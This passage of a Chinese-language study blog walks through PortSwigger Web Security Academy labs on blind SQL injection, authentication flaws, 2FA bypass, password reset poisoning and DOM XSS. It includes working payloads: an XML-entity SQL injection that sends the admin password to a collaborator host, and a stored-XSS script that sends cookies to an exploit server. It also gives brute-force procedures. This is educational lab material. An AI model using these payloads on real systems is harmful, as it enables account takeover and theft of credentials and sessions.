/></li><li>2<img src="https://s2.loli.net/2023/07/17/fU5AQOPRl8BoLJq.png"alt="image-20230717182506279" /></li></ol></li><li>操纵结果<ol type="1"><li>显示响应列<imgsrc="https://s2.loli.net/2023/07/17/WnJjRLfth7FaPHE.png"alt="image-20230717182602320" /></li><li>高亮选中的响应行<imgsrc="https://s2.loli.net/2023/07/17/2rm5oWtR7se84wV.png"alt="image-20230717182643205" /></li><li>按payload1排序</li></ol></li></ol></li></ol><h5 id="lab-blind-sql-injection-with-out-of-band-data-exfiltration">Lab:Blind SQL injection with out-of-band data exfiltration</h5><ol type="1"><li><p>替换掉这里的服务器地址<imgsrc="https://s2.loli.net/2023/07/18/Z6fzikxn1Ku4NRa.png"alt="image-20230718065619069" /></p><p>也可右击：<imgsrc="https://s2.loli.net/2023/07/18/2KHSuIj7ECGZ9Qx.png"alt="image-20230718070822589" /></p><p>payload:</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">' UNION SELECT EXTRACTVALUE(xmltype('</span><span class="token operator">&lt;</span>?xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span> <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY <span class="token operator">%</span> remote SYSTEM <span class="token string">"http://'||(SELECT password FROM users WHERE username='administrator')||'kznuf4bv5tmqp5m8sun2099zcqih6bu0.oastify.com/"</span><span class="token operator">></span> <span class="token operator">%</span>remote<span class="token punctuation">;</span><span class="token punctuation">]</span><span class="token operator">></span></code></pre></li><li><p>collaborator出现交互,<imgsrc="https://s2.loli.net/2023/07/18/EWa3vsK9BPtgZDo.png"alt="image-20230718071012819" /></p><ol type="1"><li>红色标记，即为要查询的密码</li><li>如果是http请求，则查询的内容在host处</li></ol></li></ol><h3 id="authentication-vulnerabilities重置版">Authenticationvulnerabilities（重置版）</h3><h4 id="vulnerabilities-in-password-based-login">Vulnerabilities inpassword-based login</h4><ul><li>different status code</li></ul><h5 id="lab-username-enumeration-via-subtly-different-responses">Lab:Username enumeration via subtly different responses</h5><ol type="1"><li>发送登录请求，得到响应</li><li>intruder:设置<code>Grep Extract</code>,选中invalid.....<imgsrc="https://s2.loli.net/2023/07/18/3oC794EdaQpPMzh.png"alt="image-20230718100143492" />开始攻击</li><li>观察结果，没点<imgsrc="https://s2.loli.net/2023/07/18/e6bhsji9kTXI5KF.png"alt="image-20230718100321645" /></li><li>用户名 intruder,结果观察状态码.</li></ol><h5 id="lab-username-enumeration-via-response-timing">Lab: Usernameenumeration via response timing</h5><ul><li>Notice that <strong>your IP will be blocked</strong> if you make toomany invalid login attempts.</li><li>Pay particular attention to the <strong>response times</strong>.Notice that when the username is invalid, the response time is roughlythe same. However, when you enter a valid username (your own), theresponse time is increased depending on the <strong>length of thepassword</strong> you entered.</li></ul><ol type="1"><li><p><strong>X-Forwarded-For</strong>：password设置长度足够长，以区别不对的用户名<imgsrc="https://s2.loli.net/2023/07/18/iK8IojuQbqMpAvG.png"alt="image-20230718153121353" /></p><p>IP地址没有小数<imgsrc="https://s2.loli.net/2023/07/18/tLIa1hzRXA8u24e.png"alt="image-20230718153300975" /></p></li><li><p>结果<img src="https://s2.loli.net/2023/07/18/F4Oo2HwhqzrPuYR.png"alt="image-20230718153613773" /></p></li></ol><h5 id="lab-broken-brute-force-protection-ip-block">Lab: Brokenbrute-force protection, IP block</h5><ul><li>封锁ip,封锁账号，在封锁前可以使用自己账号重置等待时间</li></ul><ol type="1"><li><strong>pitchfork</strong><ol type="1"><li>用户名爆破，交替形式<imgsrc="https://s2.loli.net/2023/07/18/YK3Z2m4QkpB7hrv.png"alt="image-20230718161651441" /></li><li>密码与用户名意义对应</li></ol></li><li>结果<img src="https://s2.loli.net/2023/07/18/BTUQ6HlNFntGczd.png"alt="image-20230718161802100" /></li></ol><h5 id="lab-username-enumeration-via-account-lock">Lab: Usernameenumeration via account lock</h5><ul><li>responses from the server indicating that an account is locked canalso help an attacker to enumerate usernames.</li></ul><ol type="1"><li>intruder<ol type="1"><li>position<imgsrc="https://s2.loli.net/2023/07/18/4aYO5dj1oiCQLgz.png"alt="image-20230718163603865" /></li><li>payload2<imgsrc="https://s2.loli.net/2023/07/18/RnrfYvWAbhUcBI7.png"alt="image-20230718163944629" /></li></ol></li><li>结果：Username<imgsrc="https://s2.loli.net/2023/07/18/F9mhKRN3QrzZdlw.png"alt="image-20230718164921592" /></li><li>爆破密码，Grep Extract<imgsrc="https://s2.loli.net/2023/07/18/kQOqJlM8LtoA5Zc.png"alt="image-20230718165036081" /><ol type="1"><li>结果<img src="https://s2.loli.net/2023/07/18/SysKYhlWAGn94Eu.png"alt="image-20230718165147674" /></li></ol></li></ol><h5id="lab-broken-brute-force-protection-multiple-credentials-per-request">Lab:Broken brute-force protection, multiple credentials per request</h5><ol type="1"><li>Json格式提交参数<imgsrc="https://s2.loli.net/2023/07/18/pfQFhERdq9wIBe3.png"alt="image-20230718172602311" /></li></ol><h4 id="vulnerabilities-in-multi-factor-authentication">Vulnerabilitiesin multi-factor authentication</h4><h5 id="lab-2fa-simple-bypass">Lab: 2FA simple bypass</h5><ul><li>登录与验证不是同一个页面</li></ul><ol type="1"><li>首先使用wiener登录，接受验证码登录</li><li>换carlos账号登录，在输入验证码页面的url上换成 `mycount=wiener'(换成上一个账号的已登录页面)</li><li>再刷新页面，carlos账号登录</li></ol><h5 id="lab-2fa-broken-logic">Lab: 2FA broken logic</h5><ul><li>这个真的折腾了超级久</li></ul><ol type="1"><li>wiener 账号登录并验证</li><li>选择这个Get/login2请求，发送到repeater,确保验证码是给carlos<imgsrc="https://s2.loli.net/2023/07/19/oOSRkvi5dcn6pe1.png"alt="image-20230719145132898" /></li><li>选择Post /login2请求发送到intruder，<imgsrc="https://s2.loli.net/2023/07/19/nB7SEYvUrmqdHOj.png"alt="image-20230719145404941" /></li></ol><h5 id="lab-2fa-bypass-using-a-brute-force-attack">Lab: 2FA bypass usinga brute-force attack</h5><ol type="1"><li><p>With Burp running, log in as <code>carlos</code> and investigatethe 2FA verification process. Notice that if you enter the wrong codetwice, you will be logged out again. You need to use Burp's sessionhandling features to log back in automatically before sending eachrequest.</p></li><li><p>In Burp, go to <strong>Project options &gt; Sessions</strong>. Inthe <strong>Session Handling Rules</strong> panel, click<strong>Add</strong>. The <strong>Session handling rule editor</strong>dialog opens.</p></li><li><p>In the dialog, go to the <strong>Scope</strong> tab. Under<strong>URL Scope</strong>, select the option <strong>Include allURLs</strong>.</p></li><li><p>Go back to the <strong>Details</strong> tab and under<strong>Rule Actions</strong>, click <strong>Add &gt; Run amacro</strong>.</p></li><li><p>Under <strong>Select macro</strong> click <strong>Add</strong> toopen the <strong>Macro Recorder</strong>. Select the following 3requests:</p><pre class="language-none"><code class="language-none">GET &#x2F;loginPOST &#x2F;loginGET &#x2F;login2</code></pre><p>Then click <strong>OK</strong>. The <strong>Macro Editor</strong>dialog opens.</p></li><li><p>Click <strong>Test macro</strong> and check that the finalresponse contains the page asking you to provide the 4-digit securitycode. This confirms that the macro is working correctly.</p></li><li><p>Keep clicking <strong>OK</strong> to close the various dialogsuntil you get back to the main Burp window. The macro will nowautomatically log you back in as Carlos before each request is sent byBurp Intruder.</p></li><li><p>Send the <code>POST /login2</code> request to BurpIntruder.</p></li><li><p>In Burp Intruder, add a payload position to the<code>mfa-code</code> parameter.</p></li><li><p>On the <strong>Payloads</strong> tab, select the<strong>Numbers</strong> payload type. Enter the range 0 - 9999 and setthe step to 1. Set the min/max integer digits to 4 and max fractiondigits to 0. This will create a payload for every possible 4-digitinteger.</p></li><li><p>Go to the <strong>Resource pool</strong> tab and add the attackto a resource pool with the <strong>Maximum concurrent requests</strong>set to <code>1</code>.</p></li><li><p>Start the attack. Eventually, one of the requests will return a302 status code. Right-click on this request and select <strong>Showresponse in browser</strong>. Copy the URL and load it in thebrowser.</p></li><li><p>Click <strong>My account</strong> to solve the lab.</p></li></ol><h4id="vulnerabilities-in-other-authentication-mechanisms">Vulnerabilitiesin other authentication mechanisms</h4><ul><li>除了基本的登录功能之外，大多数网站还提供了补充功能，允许用户管理他们的账户。例如，用户通常可以更改密码或在忘记密码时进行密码重置。然而，这些机制也可能引入漏洞，被攻击者利用<br /></li><li>然而，有些网站根据可预测的静态值（例如用户名和时间戳）拼接生成这个Cookie。有些甚至将密码作为Cookie的一部分。如果攻击者能够创建自己的账户，这种方法就特别危险，因为他们可以研究自己的Cookie，并且有可能推断出它是如何生成的。一旦他们找出这个规则，他们可以尝试对其他用户的Cookie进行暴力破解，从而获得对其账户的访问权限。<ul><li>但是简单地使用Base64等两向编码对Cookie进行"加密"是毫无保护作用的。即使使用正确的加密和单向哈希函数，也并非完全可靠。如果攻击者能够轻易识别哈希算法并且没有使用盐（salt），他们可以通过简单地对他们的字典进行哈希运算来暴力破解Cookie</li></ul></li></ul><h5 id="lab-brute-forcing-a-stay-logged-in-cookie">Lab: Brute-forcing astay-logged-in cookie</h5><ol type="1"><li><p>stay-logged-in<imgsrc="https://s2.loli.net/2023/07/29/zrutHQ2Th97sj4q.png"alt="image-20230729174848714" /></p><p>用户名后面一串极有可能是密码的hash值</p></li><li><p>intruder:stay-logged-in。注意carlos后面的<strong>冒号</strong><imgsrc="https://s2.loli.net/2023/07/20/9wFEbWnJf72xmrv.png"alt="image-20230720131918684" /></p></li></ol><h5 id="lab-offline-password-cracking">Lab: Offline passwordcracking</h5><ul><li>https://crackstation.net/</li></ul><ol type="1"><li><p>stay-logged-in cookie构成</p></li><li><p>存储型xss攻击</p><ol type="1"><li><p>复制服务器地址<imgsrc="https://s2.loli.net/2023/07/20/L384FKb2rjmAtdz.png"alt="image-20230720135144415" /></p></li><li><p>评论区插入脚本</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>查看access log<imgsrc="https://s2.loli.net/2023/07/20/FfGs7ZpPAgcHSjv.png"alt="image-20230720135328815" /></p></li></ol></li></ol><h5 id="lab-password-reset-broken-logic">Lab: Password reset brokenlogic</h5><ul><li>重置密码时并不检查身份，因此可以修改任意用户的密码</li></ul><ol type="1"><li>token 可有可无<imgsrc="https://s2.loli.net/2023/07/20/1bw79zlD2WhjNvt.png"alt="image-20230720142657091" /></li></ol><h5 id="lab-password-reset-poisoning-via-middleware">Lab: Password resetpoisoning via middleware</h5><ul><li>X-Forwarded-Host</li></ul><ol type="1"><li>X-Forwarded-Host是一个请求头。它可以用来欺骗请求的主机域名。这里将其设置为攻击者的exploitserver域名。这样重置密码的链接将指向攻击者域名。因为目标应用信任并生效了这个头。<imgsrc="https://s2.loli.net/2023/07/20/RkwtA42HsWZdP6c.png"alt="image-20230720150240028" /></li><li>查看日志，获得temp-forgot-password-token</li><li>最后<img src="https://s2.loli.net/2023/07/20/oJlA3NYhj2cbvRg.png"alt="image-20230720150335692" /></li></ol><h5 id="lab-password-brute-force-via-password-change">Lab: Passwordbrute-force via password change</h5><ul><li>注意观察当你输入错误的当前密码时的行为。如果两次输入的新密码不匹配，会将账户锁定。然而，如果你输入了一个有效的当前密码，但两个新密码不匹配，系统只会显示错误信息"Current password is incorrect" 或 "New passwords do not match"</li></ul><ol type="1"><li>intruder<imgsrc="https://s2.loli.net/2023/07/20/ouWQxyP8lF1cnXC.png"alt="image-20230720153825146" /></li><li>匹配的信息不能多或者少<imgsrc="https://s2.loli.net/2023/07/20/KxDYyjcabiLeCIV.png"alt="image-20230720153919492" /></li></ol><h3 id="authentication-vulnerabilities">Authenticationvulnerabilities</h3><h5 id="lab-username-enumeration-via-different-responses">Lab: Usernameenumeration via different responses</h5><ul><li>先爆破username</li><li>再是password</li></ul><h4 id="vulnerabilities-in-password-based-login-1">Vulnerabilities inpassword-based login</h4><ul><li><strong>key words:</strong>account(username;password;broute-force)</li><li>catagory<imgsrc="https://s2.loli.net/2023/03/19/qXLsBSpxOG8TaZl.png" /></li></ul><h5 id="flawed-brute-force-protection">Flawed brute-forceprotection</h5><ul><li><p>Locking the account that the remote user is trying to access ifthey make too many failed login attempts</p></li><li><p>Blocking the remote user's IP address if they make too many loginattempts in quick succession</p></li><li><p><strong>Lab:</strong> Broken brute-force protection, IP block</p><blockquote><ul><li>使用一个有效的账号重置自己的IP</li><li>pitchfork选项的使用</li><li>有效的账号:payload-step设置为2</li></ul></blockquote></li><li><p><strong>Lab:</strong> Username enumeration via account lock</p><ul><li><p>attack type<imgsrc="https://s2.loli.net/2023/03/19/1maM9vbRZn5Yg2I.png"alt="image-20230319084859128" /></p><blockquote><ul><li>grep extract：使用“grepextract”可以从HTTP响应中提取与指定正则表达式匹配的文本。</li><li>Add a blank payload position to the end of the request body byclicking Add § twice. The result should look something like this:<code>username=§invalid-username§&amp;password=example§§</code><ul><li>select the Null payloads type and choose the option to generate 5payloads.</li></ul></li></ul></blockquote></li></ul></li></ul><h4id="vulnerabilities-in-multi-factor-authentication-1">Vulnerabilities inmulti-factor authentication</h4><ul><li><p><strong>Lab:</strong> 2FA simple bypass</p><blockquote><ul><li>一个http请求中，Json中写入多个密码</li></ul></blockquote></li><li><p>Flawed two-factor verification logic</p><blockquote><ul><li>the website doesn't adequately verify that the same user iscompleting the second step.</li></ul></blockquote><ul><li><p>for detail</p><p>第一步验证通过之后才会有第二步验证</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>first</span></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span>...username=carlos&amp;password=qwerty</code></pre><p>分配cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK Set-Cookie: account=carlos  </span></span><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>second</span></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">account=carlos</span></span></code></pre><p>提交验证码</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>second</span></span> <span class="token http-version property">HTTP/1.1</span></span> <span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com </span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">account=carlos ...</span></span>verification-code=123456</code></pre><p>使用自己的cookie凭证，但是<strong>用户名</strong>可以任意</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>login-steps<span class="token path-separator">/</span>second</span></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">account=victim-user</span></span>...verification-code=123456</code></pre></li><li><p><strong>lab:</strong>2FA broken logic</p></li><li><p><strong>lab:</strong>Brute-forcing 2FA verification code</p><p><strong>原理：</strong></p><p>为了实现自动登录功能，攻击者可以使用Burp Suite的SessionHandling功能。这个功能可以记录登录过程中的请求（GET /login, POST /login,GET /login2），并将它们设置为Session Handling规则。然后，BurpSuite会在每次发送请求之前自动执行这些请求，以保持登录状态。</p><p>这样攻击者就可以在每次尝试暴力破解2FA代码之前自动登录系统，从而避免被系统自动注销。</p><blockquote><ul><li>GET /login：获取登录页面的HTML代码。</li><li>POST /login：向服务器提交用户名和密码，获取用户会话令牌。</li><li>GET /login2：获取带有2FA验证码输入框的页面。</li></ul></blockquote><blockquote><ul><li>输入有效的账号登录</li><li>输入两次错误的验证码</li></ul></blockquote><p><strong>设置宏:</strong><imgsrc="https://s2.loli.net/2023/03/20/ZTsdpRC9xn14UoH.png"alt="image-20230320020110029" /></p><p>选中这三个<imgsrc="https://s2.loli.net/2023/03/20/nN3R8GEsKIBu6Ua.png"alt="image-20230320020827664" /></p><figure><img src="https://s2.loli.net/2023/03/20/bSCpWjIitnRHX2a.png"alt="image-20230320020615567" /><figcaption aria-hidden="true">image-20230320020615567</figcaption></figure><figure><img src="https://s2.loli.net/2023/03/20/aGTqRiE9g82CPzu.png"alt="image-20230320020959373" /><figcaption aria-hidden="true">image-20230320020959373</figcaption></figure><p><strong>result</strong><imgsrc="https://s2.loli.net/2023/03/20/mvGYfUVQ8FziB3N.png"alt="image-20230320021056987" /></p></li></ul></li></ul><h4id="vulnerabilities-in-other-authentication-mechanisms-1">Vulnerabilitiesin other authentication mechanisms</h4><ul><li><p><strong>要点</strong>：风险</p><p>密码重置</p><p>登录记住密码（保持登录状态）</p><ul><li><p><strong>Lab: Brute-forcing a stay-logged-in cookie</strong>:</p><ul><li><p>利用<code>proxy-history</code></p></li><li><p>保持登录-&gt;logout</p></li><li><p><strong>分析stay-logged-in cookie 生成规则</strong></p><figure><img src="https://s2.loli.net/2023/03/26/cxF9Jn4zhevsrtI.png"alt="image-20230326074023169" /><figcaption aria-hidden="true">image-20230326074023169</figcaption></figure></li><li><p><strong>intruder设置</strong></p><p>需要将cookie中自己的用户名更改为要hack的用户名</p><figure><img src="https://s2.loli.net/2023/03/26/UhWTZ3DK86frQOc.png"alt="image-20230326075242818" /><figcaption aria-hidden="true">image-20230326075242818</figcaption></figure><figure><img src="https://s2.loli.net/2023/03/26/yqkthGoKQvbwHj7.png"alt="image-20230326075454030" /><figcaption aria-hidden="true">image-20230326075454030</figcaption></figure></li></ul></li><li><p><strong>Lab: Offline password cracking</strong></p><ol type="1"><li><p>跟前面实验类似：先登录自己账户-》研究<strong>stay-login-in</strong>:cookie</p><ol start="2" type="1"><li><p>发现stay-login-in构成：用户名+密码（md5编码）</p></li><li><p>因此设法获取对方stay-login-in,此处利用评论区的xss漏洞</p></li><li><p>payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1.</span> <span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token number">2.</span> 利用靶场提供的服务器：构成完整payload<span class="token number">3.</span> 稍等一会，等对方登录，并访问了那篇文章，即可偷取对方cookie<span class="token number">4.</span> 对cookie：base64解码，md5解码</code></pre></li></ol></li></ol></li><li><p><strong>Lab: Password reset broken logic</strong></p><ol type="1"><li><p>用自身账户，试探重置密码功能，发现服务器并不检查<strong>邮件链接的token</strong>和<strong>用户发送的重置密码请求的token</strong>的一致性</p></li><li><p>因此可以将token删除，并将重置密码的用户名更改为攻击目标</p><figure><img src="https://s2.loli.net/2023/04/04/bx61MrKwaNyeSEz.png"alt="image-20230404005444860" /><figcaption aria-hidden="true">image-20230404005444860</figcaption></figure></li></ol></li><li><p><strong>Lab: Password reset poisoning via middleware</strong></p><ol type="1"><li><p>使用自身账户，试探重置密码功能，发现token会被验证</p></li><li><p>在burp-repeater上，使用如下请求头，注意中间换行<imgsrc="https://s2.loli.net/2023/04/04/RwX7VmS9oOte5Mr.png"alt="image-20230404015734378" /></p><p>X-Forward-Host:通过在请求中添加X-Forwarded-Host头，代理服务器可以将原始主机名传递给Web服务器</p></li><li><p>当目标用户carlos发送重置密码请求时，重置邮件会被发送到攻击者指定的服务器，通过服务器日志可以获得目标用户的token</p></li><li><p>将一封已知的重置链接的邮件的token换成目标用户的token，便可更改目标用户的密码</p></li></ol></li><li><p><strong>lab:Password brute-force via password change</strong></p><ol type="1"><li><p>使用自身账户，试探重置密码，发现在新密码1和新密码2不一致时</p><ol type="1"><li>如果当前密码正确：则相应，New .....</li><li>如果当密码不正切：则响应，不同</li></ol></li><li><p>intruder 配置<imgsrc="https://s2.loli.net/2023/04/04/C6SUJODonVc7hyK.png"alt="image-20230404030946394" /></p><p>匹配规则<img src="https://s2.loli.net/2023/04/04/rCft58OngRXwjZa.png"alt="second" /></p></li><li><p>result<imgsrc="https://s2.loli.net/2023/04/04/C9ZjWfdMb5Eyuwq.png"alt="image-20230404031321962" /></p></li></ol></li></ul></li></ul><h3 id="cross-site-scripting重置版">Cross-site scripting（重置版）</h3><h4 id="what-is-cross-site-scripting-xss">What is cross-site scripting(XSS)?</h4><h4 id="xss不同类型区分">Xss不同类型区分</h4><ul><li><p><strong>反射型XSS漏洞</strong>发生在应用程序将用户输入的数据（通常是通过URL参数）包含在响应中，并且在客户端（浏览器）上执行这些数据的情况下。</p><p>漏洞的原理如下：</p><ol type="1"><li><p>攻击者构造一个恶意的URL，并在URL参数中插入恶意的脚本代码，例如：<code>https://vulnerable-website.com/search?query=&lt;script&gt;alert('XSS Attack')&lt;/script&gt;</code></p></li><li><p>用户访问包含恶意URL的网页时，浏览器会发送请求到<code>vulnerable-website.com</code>，并将恶意的脚本代码传递给服务器。</p></li><li><p>服务器接收到请求，并将恶意脚本代码包含在响应中，例如：<code>&lt;p&gt;搜索结果： &lt;script&gt;alert('XSS Attack')&lt;/script&gt;&lt;/p&gt;</code></p></li><li><p>浏览器接收到响应后，会解析HTML，并执行其中的JavaScript代码。这时，恶意的脚本代码会被执行，弹出一个警告框，这就是XSS攻击成功的例子。</p></li></ol><p>漏洞之所以称为"反射型"，是因为恶意脚本代码并没有被永久地储存在目标网站上，而是"反射"回浏览器执行。漏洞主要存在于应用程序未正确过滤或编码用户输入，导致恶意代码被传递到应用程序的响应中，从而使得攻击者可以在用户的浏览器上执行任意脚本。</p></li><li><p><strong>存储型XSS漏洞</strong>发生在应用程序将用户输入的数据（通常是通过表单提交或其他方式）存储在服务器端，并在后续的页面加载或展示中未经过滤地包含在页面中，从而导致恶意脚本被执行。</p><p>漏洞的原理如下：</p><ol type="1"><li><p>攻击者在应用程序的输入字段中插入恶意的脚本代码，例如在评论框或消息框中：<code>&lt;script&gt;alert('XSS Attack')&lt;/script&gt;</code></p></li><li><p>用户将恶意脚本代码提交给应用程序，通常是通过表单提交或其他交互方式。</p></li><li><p>应用程序接收到用户输入的数据，并将其存储在数据库或其他数据存储位置中，未经过滤或编码地储存恶意脚本代码。</p></li><li><p>当其他用户或管理员查看评论、消息或其他包含用户输入数据的页面时，服务器将恶意脚本代码包含在响应中，并将其发送到浏览器。</p></li><li><p>浏览器接收到响应后，会解析HTML，并执行其中的JavaScript代码。这时，恶意的脚本代码会被执行，弹出一个警告框，这就是XSS攻击成功的例子。</p></li></ol><p>存储型XSS漏洞之所以称为"存储型"，是因为恶意脚本代码被永久地储存在目标网站的数据库或其他数据存储位置中，而不仅仅是"反射"回浏览器执行。攻击者利用漏洞在应用程序的存储中注入恶意代码，这些恶意代码在后续的页面加载中被加载和执行。</p></li><li><p><strong>DOM型XSS漏洞</strong>是一种特殊类型的跨站脚本攻击，与传统的反射型和存储型XSS攻击不同。DOM型XSS漏洞是由于客户端（浏览器）中的JavaScript代码在处理用户输入时，未经适当处理而导致的安全漏洞。</p><p>漏洞的原理如下：</p><ol type="1"><li><p>攻击者构造恶意的URL，包含了恶意的JavaScript代码。这些代码可能会包含在URL的查询字符串、哈希部分或其他参数中。</p></li><li><p>用户点击或访问带有恶意URL的页面。浏览器加载该URL，并解析其中的JavaScript代码。</p></li><li><p>JavaScript代码会直接操作文档对象模型（DOM），修改页面的内容或执行其他操作。</p></li><li><p>攻击者的恶意JavaScript代码可能会执行各种恶意操作，如窃取用户敏感信息、劫持用户会话、篡改页面内容等。</p></li><li><p>由于DOM型XSS漏洞是在浏览器端执行的，所以它不需要将恶意代码传递到服务器端，因此无法通过服务器端的过滤或编码来阻止。</p></li></ol><p>DOM型XSS漏洞之所以称为"DOM型"，是因为攻击主要发生在浏览器中的DOM操作过程中。当用户访问恶意URL时，浏览器会执行其中的JavaScript代码，而不需要将数据发送到服务器。</p></li><li><p><strong>Self-XSS（自我跨站脚本）</strong>是一种社交工程手段，攻击者通过欺骗用户在浏览器控制台或开发者工具中执行恶意代码。与传统的XSS漏洞不同，Self-XSS并不是一种真正的漏洞，而是利用用户的不知情和轻信来实施攻击。</p><p>Self-XSS的原理如下：</p><ol type="1"><li><p>攻击者制作一个诱导性的消息或诱骗用户点击特殊链接的社交工程页面，通常伪装成一个看似有趣或有奖励的内容。</p></li><li><p>用户被欺骗后，点击了诱导性的链接或访问了社交工程页面。</p></li><li><p>社交工程页面上通常会提示用户在浏览器的开发者工具或控制台中粘贴一段代码，并声称这是获得奖励或解锁特定功能的必要步骤。</p></li><li><p>用户出于好奇或追求奖励，被鼓励在开发者工具或控制台中执行代码。</p></li><li><p>恶意代码会利用用户的特权执行恶意操作，例如盗取用户的敏感信息、劫持用户会话、篡改页面内容等。</p></li></ol><p>Self-XSS的特点是攻击者需要诱骗用户自行执行恶意代码，而不是直接注入恶意脚本到网页上。由于Self-XSS不是真正的漏洞，因此它不能通过对代码的过滤或编码来修复。相反，解决Self-XSS的关键在于教育和提高用户的安全意识。</p></li></ul><h4 id="stored-xss">Stored XSS</h4><h4 id="dom-based-xss">DOM-based XSS</h4><ul><li><p>在DOM型XSS中,源(source)到沉淀(sink)的污点传播过程可以概括如下:</p><ol type="1"><li>源:包含用户可控数据的输入,常见的如URL、输入框值等。</li><li>污点:源中的恶意数据,如XSS payload。</li><li>传播:通过程序中的变量、函数调用等将数据从源传播到沉淀。</li><li>沉淀:会最终使用数据的危险函数,如eval、innerHTML等。</li><li>当污点到达沉淀时,沉淀函数会对其进行解释执行,实现XSS。</li></ol><p>整个过程具体可包括:</p><ul><li>从window.location读取URL值到变量</li><li>通过DOM操作将变量设置为某个元素的属性</li><li>将此属性innerHTML渲染到页面</li></ul><p>污点经过源-&gt;传播-&gt;沉淀最后实现攻击</p></li></ul><h5id="lab-dom-xss-in-document.write-sink-using-source-location.search">Lab:DOM XSS in document.write sink using source location.search</h5><ol type="1"><li><p>输入“12345”，发现位置<imgsrc="https://s2.loli.net/2023/07/21/BlhUTL7ISA9OpCj.png"alt="image-20230721145920456" /></p></li><li><p>payload</p><pre class="language-markup" data-language="markup"><code class="language-markup">"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span></code></pre></li></ol><h5id="lab-dom-xss-in-document.write-sink-using-source-location.search-inside-a-select-element">Lab:DOM XSS in document.write sink using source location.search inside aselect element</h5><ol type="1"><li><p>此处的选择框<imgsrc="https://s2.loli.net/2023/07/21/kSWVaOf4oPJBpvz.png"alt="image-20230721152453050" /></p></li><li><p>script<imgsrc="https://s2.loli.net/2023/07/21/NCo9RMuFstSPQ1B.png"alt="image-20230721152519053" /></p><p>这段代码存在DOM型XSS漏洞,可以分析如下:</p><ol type="1"><li>定义了一个stores数组,包含城市名。</li><li>从URL参数storeId中读取值赋给store变量。</li><li>使用document.write输出一个下拉列表。</li><li>如果store不为空,则添加一个选中它的option。</li><li>遍历stores数组,添加其它选项。</li><li>问题在于,store值来自用户可控的URL参数。</li><li>但在document.write中直接拼接到HTML中。</li><li>如果用户输入一个script标签,就可以注入任意JS代码。</li><li>例如传入storeId=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li><li>就会在页面注入并执行alert(1)弹框。</li></ol></li><li><p>Payload</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">product<span class="token operator">?</span>productId<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>storeId<span class="token operator">=</span>"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img<span class="token operator">%</span>20src<span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span>20onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre></li></ol><h5 id="lab-dom-xss-in-innerhtml-sink-using-source-location.search">Lab:DOM XSS in innerHTML sink using source location.search</h5><ol type="1"><li><p>Js<img src="https://s2.loli.net/2023/07/21/SIKJ1qykZC2NTxP.png"alt="image-20230721153221386" /></p><p>innerHTML沉淀的关键特点是:</p><ol type="1"><li>现代浏览器不会在innerHTML中执行script标签。</li><li>也不会触发svg的onload事件。</li><li>所以需要使用img、iframe等替代元素。</li><li>可以配合onload、onerror等事件处理函数使用。</li></ol></li><li><p>Payload</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>1</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript 